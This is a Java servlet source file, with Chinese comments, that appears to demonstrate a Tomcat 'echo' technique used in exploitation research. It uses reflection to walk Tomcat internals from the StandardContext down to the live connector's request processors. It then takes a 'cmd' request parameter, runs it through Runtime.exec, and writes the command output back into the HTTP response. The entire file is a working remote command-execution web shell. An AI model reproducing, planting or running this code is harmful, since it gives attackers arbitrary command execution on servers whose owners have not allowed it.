package Echo;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

@WebServlet("/response")
public class Tomcat_Echo_Response extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        //获取StandardService
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        System.out.println(standardContext);

        try {
            //获取ApplicationContext
            Field applicationContextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);

            //获取StandardService
            Field standardServiceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            standardServiceField.setAccessible(true);
            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);

            //获取Connector
            Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectorsField.setAccessible(true);
            Connector[] connectors = (Connector[]) connectorsField.get(standardService);
            Connector connector = connectors[0];

            //获取Handler
            ProtocolHandler protocolHandler = connector.getProtocolHandler();
            Field handlerField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

            //获取内部类AbstractProtocol$ConnectionHandler的global属性
            Field globalHandler = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalHandler.setAccessible(true);
            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);

            //获取processors
            Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processorsField.setAccessible(true);
            List<RequestInfo> requestInfoList = (List<RequestInfo>) processorsField.get(global);

            //获取request和response
            Field requestField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            requestField.setAccessible(true);
            for (RequestInfo requestInfo : requestInfoList){

                //获取org.apache.coyote.Request
                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);

                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
                org.apache.catalina.connector.Response http_response = http_request.getResponse();

                PrintWriter writer = http_response.getWriter();
                String cmd = http_request.getParameter("cmd");

                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            }


        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
